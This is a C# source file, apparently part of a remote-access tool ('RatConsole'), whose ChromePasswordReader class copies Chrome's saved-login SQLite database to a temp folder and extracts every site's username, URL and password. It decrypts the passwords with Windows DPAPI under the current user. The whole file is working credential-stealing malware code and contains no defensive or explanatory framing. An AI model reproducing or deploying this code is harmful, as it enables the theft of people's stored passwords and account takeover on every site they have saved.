using System;
using System.IO;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Text;

using RatConsole.Domain.Models;

namespace RatConsole.Domain.Services.Passwords
{
	/// <summary>
	///		Clase de lectura de las contraseñas de Chrome del usuario
	/// </summary>
	public class ChromePasswordReader
	{
        /// <summary>
        ///		Obtiene las contraseñas de Google Chrome
        /// </summary>
        public List<UserModel> GetPasswords()
        {
			var users = new	List<UserModel>();
            string dbSource = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome\\User Data\\Default\\Login Data");

				if (File.Exists(dbSource))
				{
					string dbTarget = Path.Combine(Path.GetTempPath(), "dbLogins");

						// Copia la base de datos en el directorio destino para evitar que se bloqueen los datos
						Bau.Libraries.LibCommonHelper.Files.HelperFiles.KillFile(dbTarget);
						Bau.Libraries.LibCommonHelper.Files.HelperFiles.CopyFile(dbSource, dbTarget);
						// Lee los datos de la base de datos SQLite
						if (File.Exists(dbTarget))
							users = ReadUsers(dbTarget);
						// Elimina la base de datos temporal
						Bau.Libraries.LibCommonHelper.Files.HelperFiles.KillFile(dbTarget);
				}
				// Devuelve los usuarios leídos
				return users;
        }

		/// <summary>
		///		Lee los usuarios y contraseñas de la base de datos
		/// </summary>
		private List<UserModel> ReadUsers(string dbTarget)
		{
			var users = new List<UserModel>();

				// Lee los usuarios
				using (SQLiteConnection connection = new SQLiteConnection($"Data Source={dbTarget};Version=3;"))
				{
					// Abre la conexión
					connection.Open(); 
					// Ejecuta el comando
					using (SQLiteCommand command = new SQLiteCommand(@"SELECT username_value, password_value, origin_url 
																		 FROM logins 
																		 WHERE blacklisted_by_user = 0", connection))
					{
						using (SQLiteDataReader reader = command.ExecuteReader()) 
						{
							while (reader.Read())
								users.Add(new UserModel("Chrome")
												{ 
													User = Convert.ToString(reader["username_value"]),
													Password = Encoding.UTF8.GetString(ProtectedData.Unprotect((byte[]) reader["password_value"], 
																					  null, DataProtectionScope.CurrentUser)),
													Url = Convert.ToString(reader["origin_url"])
												}
										 );
						}
					}
				}
				// Devuelve los usuarios
				return users;
		}

		/// <summary>
		///		Desencripta la contraseña
		/// </summary>
		private string Decrypt(byte[] blob)
        {
            return System.Text.Encoding.UTF8.GetString(ProtectedData.Unprotect(blob, null, DataProtectionScope.CurrentUser));
        }
	}
}